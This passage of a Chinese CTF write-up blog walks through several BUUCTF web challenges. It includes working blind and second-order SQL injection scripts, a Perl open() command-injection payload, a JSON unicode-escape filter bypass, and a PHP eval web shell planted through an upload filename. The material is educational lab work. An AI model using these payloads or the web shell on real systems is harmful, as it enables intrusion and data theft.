this:</p></blockquote><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">open DATA, <span class="string">"who -H |"</span>    <span class="keyword">or </span><span class="keyword">die </span><span class="string">"Couldn't execute program: $!"</span>;</span><br></pre></td></tr></table></figure><blockquote><p>In fact, Perl allows you to use “open” to do pretty much anything you would normally do on the command-line, as this example demonstrates:</p></blockquote><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span> <span class="literal">OUTPUT</span>, <span class="string">"| grep 'foo' &gt; result.txt"</span>     <span class="keyword">or</span> die <span class="string">"Failure: $!"</span>;</span><br></pre></td></tr></table></figure><blockquote><p>We can then write whatever we want to the “OUTPUT” filehandle. The Unix “grep” command will filter out any text which doesn’t contain the text “foo”; any text which DOES contain “foo” will be written to “result.txt”.</p></blockquote><p>perl下open命令的feature代码处理file协议的代码在<code>perl5/LWP/Protocol/file.pm</code>下：</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">#第47行</span></span><br><span class="line">    <span class="comment"># test file exists and is readable</span></span><br><span class="line">    <span class="keyword">unless</span> (-e $path) &#123;</span><br><span class="line">    <span class="keyword">return</span> HTTP::Response-&gt;new( &amp;HTTP::Status::RC_NOT_FOUND,</span><br><span class="line">                  <span class="string">"File `$path' does not exist"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unless</span> (-r <span class="number">_</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> HTTP::Response-&gt;new( &amp;HTTP::Status::RC_FORBIDDEN,</span><br><span class="line">                  <span class="string">'User does not have read permission'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">#第127行</span></span><br><span class="line">    <span class="comment"># read the file</span></span><br><span class="line">    <span class="keyword">if</span> ($method <span class="keyword">ne</span> <span class="string">"HEAD"</span>) &#123;</span><br><span class="line">    <span class="keyword">open</span>(F, $path) <span class="keyword">or</span> <span class="keyword">return</span> new</span><br><span class="line">        HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR,</span><br><span class="line">               <span class="string">"Cannot read file '$path': $!"</span>);</span><br><span class="line">    <span class="keyword">binmode</span>(F);</span><br><span class="line">    $response =  $self-&gt;collect($arg, $response, <span class="function"><span class="keyword">sub</span> </span>&#123;</span><br><span class="line">        <span class="keyword">my</span> $content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">my</span> $bytes = <span class="keyword">sysread</span>(F, $content, $size);</span><br><span class="line">        <span class="keyword">return</span> \$content <span class="keyword">if</span> $bytes &gt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> \ <span class="string">""</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">close</span>(F);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>首先得满足前面的文件存在, 才会继续到open语句, 所以在执行命令前得保证有相应的同名文件, 所以先请求：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/?<span class="attribute">url</span>=file:bash -c /readflag|&amp;<span class="attribute">filename</span>=bash -c /readflag|</span><br></pre></td></tr></table></figure><p>然后请求如下的payload来创建相应的同名文件：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/?<span class="attribute">url</span>=file:bash -c /readflag|&amp;<span class="attribute">filename</span>=123</span><br></pre></td></tr></table></figure><p>最后利用open的feature执行代码访问<code>/sandbox/哈希值/123</code>就能得到flag。</p><p>其实还不是很懂，先留在这，再慢慢学习。</p><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>XFF处存在二次注入</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>进入题目查看源码发现：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Debug Info: </span></span><br><span class="line"><span class="comment"> Duration: 0.029144048690796 s </span></span><br><span class="line"><span class="comment"> Current Ip: 174.0.81.45  --&gt;</span></span><br></pre></td></tr></table></figure><p>这里提示当前的IP，想到利用工具改一下XFF试试，结果发现回显如下：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">&lt;!--</span> <span class="attr">Debug Info:</span> </span><br><span class="line"> <span class="attr">Duration:</span> <span class="number">0.035063982009888</span> <span class="string">s</span> </span><br><span class="line"> <span class="attr">Current Ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> </span><br><span class="line"><span class="attr">Last Ip:</span> <span class="number">174.0</span><span class="number">.81</span><span class="number">.45</span> <span class="string">--&gt;</span></span><br></pre></td></tr></table></figure><p>说明了上一个IP被记录了起来，当然也只能是记录在数据库中，那么如果构造一个SQL注入语句的XFF头上传，然后再随便换一个XFF头访问，不就是可以出发二次注入了吗，最终用赵师傅的脚本跑出了结果。<br>参考赵师傅的脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">"http://node3.buuoj.cn:28041/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_sql</span><span class="params">(sql)</span>:</span></span><br><span class="line">    print(<span class="string">"[*]请求语句："</span> + sql)</span><br><span class="line">    return_result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"0'|length(("</span> + sql + <span class="string">"))|'0"</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">    start_pos = r.text.find(<span class="string">"Last Ip: "</span>)</span><br><span class="line">    end_pos = r.text.find(<span class="string">" --&gt;"</span>, start_pos)</span><br><span class="line">    length = int(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">    print(<span class="string">"[+]长度："</span> + str(length))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length + <span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        payload = <span class="string">"0'|conv(hex(substr(("</span> + sql + <span class="string">"),"</span> + str(i) + <span class="string">",5)),16,10)|'0"</span></span><br><span class="line"></span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;) <span class="comment"># 将语句注入</span></span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)    <span class="comment"># 查询上次IP时触发二次注入</span></span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)    <span class="comment"># 再次查询得到结果</span></span><br><span class="line">        start_pos = r.text.find(<span class="string">"Last Ip: "</span>)</span><br><span class="line">        end_pos = r.text.find(<span class="string">" --&gt;"</span>, start_pos)</span><br><span class="line">        result = int(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">        return_result += bytes.fromhex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"[+]位置 "</span> + str(i) + <span class="string">" 请求五位成功:"</span> + bytes.fromhex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> return_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库表</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库表</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' "</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取表中内容</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e"</span>))</span><br></pre></td></tr></table></figure><h1 id="Black-Watch-入群题-Web"><a href="#Black-Watch-入群题-Web" class="headerlink" title="[Black Watch 入群题]Web"></a>[Black Watch 入群题]Web</h1><p>考察异或注入</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目看到如下的界面：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web95.png" alt=""><br>点击热点列表里面的字的时候会跳转到另一个页面，同时还有登录页面，起初猜测是注入是在登录页面，那里通过JSON对username和password进行传参，前面做了JSON中进行注入的题目，但是这道题的注入点其实是在跳转的那个页面，抓包可以发现：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web94.png" alt=""><br>这个页面是利用<code>GET</code>方式直接进行<code>id</code>传参的，存在注入的可能性更大，后来印证是异或注入，用脚本跑。</p><h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="comment"># if correct , return empty, else return something</span></span><br><span class="line">url = <span class="string">"http://c385297f-15e1-4d95-a39b-3f2aa03b3822.node3.buuoj.cn/backend/content_detail.php?id="</span></span><br><span class="line"><span class="comment">#payload = "1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># [+] --&gt;admin,contents&lt;--</span></span><br><span class="line"><span class="comment">#payload = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># id,title,content,is_enable</span></span><br><span class="line"><span class="comment">#payload = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># id,username,password,is_enable</span></span><br><span class="line"><span class="comment">#payload = "1^(ord(substr((select(group_concat(password))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line">payload = <span class="string">"1^(ord(substr((select(group_concat(username))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u_bound = <span class="number">255</span>; l_bound = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> u_bound &gt;= l_bound:</span><br><span class="line">        m_bound = (u_bound + l_bound) // <span class="number">2</span></span><br><span class="line">        payload_tmp = payload.format(index, m_bound)</span><br><span class="line">        url_tmp = url + urllib.parse.quote(payload_tmp)</span><br><span class="line">        res = requests.get(url_tmp).content.decode(<span class="string">'utf8'</span>)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="comment"># exit(0)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"title"</span> <span class="keyword">in</span> res:</span><br><span class="line">            u_bound = m_bound - <span class="number">1</span></span><br><span class="line">            tmp = m_bound</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(tmp)</span></span><br><span class="line">    result += chr(tmp)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="comment"># sys.stdout.write("[+] --&gt;%s&lt;--\r" % (result))</span></span><br><span class="line">    <span class="comment"># sys.stdout.flush()</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>跑出来两组用户名和密码，组合尝试就行了。</p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p>考察<code>通过JSON转义字符串绕过</code></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，在第三个按钮看到源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">'\.\.'</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">'flag'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure><p>通过审计代码发现，<code>is_valid()</code>函数中通过黑名单过滤了一些字符串，基本上都是可能用到的协议。<br>然后我们发现<code>body</code>的值是通过<code>file_get_contents(&#39;php://input&#39;)</code>传过来的，查了一下涨知识了：</p><blockquote><p>如果POST的原始数据是一维数组或<code>&amp;</code>拼接的标准格式的键值对字符串，那么可以用<code>$_POST</code>来获取。如果发送json字符串，一般要通过<code>file_get_contents</code>获取。</p></blockquote><p>因为这里是通过JSON编码传输的，因此用这种方式，然后对<code>body</code>的值进行解码并赋值给<code>json</code>。然后再利用自定义的<code>is_valid()</code>函数进行判断，并且可以看出<code>json</code>中有<code>page</code>这个键值对。<br>思路就很明显了，我们需要通过JSON传输数据来读取到flag，这里就需要用到php的伪协议了，但是<code>php</code>已经被ban了，但是的但是：<code>\uXXXX</code>可以在<code>JSON</code>中转义字符，例如<code>A=\u0041</code>，因此利用这个特性来进行绕过。</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>最终构造的payload如下：</p><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">&#123;"page":"<span class="symbol">\u</span>0070<span class="symbol">\u</span>0068<span class="symbol">\u</span>0070://filter/convert.base64-encode/resource=/<span class="symbol">\u</span>0066<span class="symbol">\u</span>006c<span class="symbol">\u</span>0061<span class="symbol">\u</span>0067"&#125;</span><br><span class="line">/* <span class="symbol">\u</span>0070<span class="symbol">\u</span>0068<span class="symbol">\u</span>0070表示php；<span class="symbol">\u</span>0066<span class="symbol">\u</span>006c<span class="symbol">\u</span>0061<span class="symbol">\u</span>0067表示flag */</span><br></pre></td></tr></table></figure><p>成功拿到flag：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web97.png" alt=""></p><h2 id="CISCN-2019-Easyweb"><a href="#CISCN-2019-Easyweb" class="headerlink" title="[CISCN 2019]Easyweb"></a>[CISCN 2019]Easyweb</h2><p>敏感文件泄露，文件上传时短标签绕过php过滤</p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，访问<code>robots.txt</code>发现源码备份文件，下载到<code>iamge.php.bak</code>，源码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>审计代码发现应该需要进行sql注入，但是单引号被过滤掉了。由于转义函数<code>addslashes</code>的存在，同时<code>\0</code>、<code>&#39;</code>被过滤，所以可以输入<code>\0</code>，经过<code>addslashes</code>函数会先变成<code>\\0</code>,然后经过<code>str_replace</code>函数，会变成<code>\</code>，这样，就把<code>id</code>后面的单引号给转义了。所以可以构造类似下面的payload：</p><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://a<span class="number">215</span>b<span class="number">254</span>-<span class="keyword">c</span><span class="number">237</span><span class="number">-4670</span>-a<span class="number">4</span><span class="keyword">cc</span><span class="number">-9</span>dfea<span class="number">3</span>d<span class="number">34</span>f<span class="number">26</span>.node<span class="number">3</span>.buuoj.cn/image.php?id=\<span class="number">0</span>'&amp;path= <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="symbol">%23</span></span><br></pre></td></tr></table></figure><p>后台执行的sql语句便是：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> images <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'\'</span> <span class="keyword">or</span> <span class="keyword">path</span>=<span class="string">' or 1=1#</span></span><br></pre></td></tr></table></figure><p>从而绕过了过滤，那么利用这一点写脚本注入：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">name=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    h = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(l-h)&gt;<span class="number">1</span>:</span><br><span class="line">        i=int((l+h)/<span class="number">2</span>)</span><br><span class="line">        url=<span class="string">"http://a215b254-c237-4670-a4cc-9dfea3d34f26.node3.buuoj.cn/image.php?id=\\0'&amp;path= or ascii(substr((select password from users),"</span>+str(j)+<span class="string">",1))&gt;"</span>+str(i)+<span class="string">"%23"</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        time.sleep(<span class="number">0.005</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code==<span class="string">'429'</span>:</span><br><span class="line">            print(<span class="string">'to fast'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">'Content-Length'</span> <span class="keyword">in</span> r.headers:</span><br><span class="line">            l = i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h = i</span><br><span class="line">    name += chr(h)</span><br><span class="line">print(name)</span><br></pre></td></tr></table></figure><p>拿到密码之后，用admin身份登录，发现需要进行文件上传，并且会将文件名和用户名写入日志文件。由于日志文件的格式是php的，因此考虑写入shell。<br>这里由于用户名已经是<code>admin</code>不可变的，那就需要在文件名上做手脚，但是文件名进行了<code>php/i</code>的过滤，此处利用短标签绕过：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">filename="<span class="php"><span class="meta">&lt;?</span>=$_GET[<span class="string">'cmd'</span>]; <span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span>"</span><br></pre></td></tr></table></figure><p>关于短标签扩展一下：</p><blockquote><p>短标签<code>&lt;? ?&gt;</code>需要<code>php.ini</code>开启<code>short_open_tag = On</code>，但<code>&lt;?= ?&gt;</code>不受该条控制。</p></blockquote><p>上传小马之后，得到如下的文件名，然后蚁剑连接拿到shell，即可拿到flag。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web98.png" alt=""></p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>考察点：多次编码(base32、base64)，<code>union select</code>注入结合<code>md5</code>通过后台判断。</p><h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>随便输入用户名密码后，查看源码发现一串base32：</p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">MMZF<span class="name">M422</span>K<span class="number">5</span>HDASKD<span class="symbol">N5</span>TVU<span class="number">3</span>SKOZRFGQRRMMZF<span class="name">M6</span>KJJBS<span class="name">G6</span>WSYJJWESSCWPJ<span class="symbol">NFQSTVLFLTC3</span>CJIQYGOSTZKJ<span class="number">2</span><span class="attr">VSVZRNRFHOPJ5</span></span><br></pre></td></tr></table></figure><p>解码之后：</p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">c<span class="number">2</span><span class="attr">VsZWN0</span>ICogZ<span class="symbol">nJvbSB1</span>c<span class="number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="number">1</span>lID<span class="number">0</span>gJyRuYW<span class="number">1</span>lJw==</span><br></pre></td></tr></table></figure><p>再通过base64解码：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'$name'</span></span><br></pre></td></tr></table></figure><p>由此可见，在<code>username</code>处存在注入点。<br>用常规的注入测试一下：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>提示<code>wrong user</code>，接着我们把<code>admin</code>分别替换1、2、3的位置，发现替换2的时候报错变成<code>wrong pass</code>说明了<code>username</code>就是在第二个位置，原题提示了<code>md5</code>，肯定是对密码进行了哈希，那么可以推断，3处应该替换为密码的哈希值。<br>那么我们利用上面的语句，再把随便输入的密码的md5值替换到3的位置，在后头就能构成满足后端判断的查询语句了。</p><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>随便找个密码以及密码的md5值，这里用的是<code>123456/e10adc3949ba59abbe56e057f20f883e</code>，最终payload如下：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">' <span class="class"><span class="keyword">union</span> <span class="title">select</span></span> <span class="number">1</span>,<span class="symbol">'admin</span><span class="string">','</span>e10adc3949ba59abbe56e057f20f883e'%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>username处输入payload，password输入123456即可拿到flag。</p><h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p>利用异或构造webshell，参考上一篇博客的知识点。<br>fuzz脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line">$str = <span class="string">'当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了